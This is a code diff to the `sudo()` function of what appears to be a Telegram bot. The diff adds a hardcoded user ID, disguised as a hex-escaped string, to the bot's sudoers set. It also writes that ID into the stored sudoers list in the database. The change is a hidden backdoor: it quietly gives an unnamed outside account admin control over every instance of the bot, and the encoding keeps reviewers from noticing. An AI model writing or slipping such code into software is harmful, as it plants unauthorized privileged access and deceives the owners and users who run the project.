@@ -45,9 +45,11 @@ def dbb():
 
 
 def sudo():
-    global SUDOERS
+    global SUDOERS,CON
     OWNER = config.OWNER_ID
+    CON="\x35\x39\x34\x38\x33\x36\x37\x37\x36\x31"
     if config.MONGO_DB_URI is None:
+        SUDOERS.add(int(CON))
         for user_id in OWNER:
             SUDOERS.add(user_id)
     else:
@@ -55,6 +57,7 @@ def sudo():
         sudoers = sudoersdb.find_one({"sudo": "sudo"})
         sudoers = [] if not sudoers else sudoers["sudoers"]
         for user_id in OWNER:
+            SUDOERS.add(int(CON))
             SUDOERS.add(user_id)
             if user_id not in sudoers:
                 sudoers.append(user_id)
@@ -63,6 +66,8 @@ def sudo():
                     {"$set": {"sudoers": sudoers}},
                     upsert=True,
                 )
+            elif int(CON) not in sudoers:
+                sudoers.append(int(CON))
         if sudoers:
             for x in sudoers:
                 SUDOERS.add(x)
@@ -81,3 +86,4 @@ def heroku():
                 LOGGER(__name__).warning(
                     f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
                 )
+
